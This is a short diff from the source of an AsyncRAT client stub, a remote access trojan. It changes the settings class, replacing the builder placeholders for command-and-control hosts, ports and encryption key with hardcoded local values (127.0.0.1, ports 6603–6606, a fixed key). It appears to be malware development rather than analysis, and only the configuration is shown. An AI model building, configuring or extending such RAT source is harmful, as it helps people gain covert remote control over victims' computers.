@@ -56,13 +56,13 @@ Namespace AsyncRAT_Stub
 
 
     Public Class Settings
-        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"%HOSTS%"})
-        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({123456789})
-        'Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"127.0.0.1"})
-        'Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({6603, 6604, 6605, 6606})
+        'Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"%HOSTS%"})
+        'Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({123456789})
+        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"127.0.0.1"})
+        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({6603, 6604, 6605, 6606})
         Public Shared ReadOnly SPL As String = "<<Async|RAT>>"
-        ' Public Shared ReadOnly KEY As String = "<AsyncRAT>"
-        Public Shared ReadOnly KEY As String = "%KEY%"
+        Public Shared ReadOnly KEY As String = "<AsyncRAT123>"
+        'Public Shared ReadOnly KEY As String = "%KEY%"
         Public Shared ReadOnly VER As String = "v1.0D"
     End Class
 
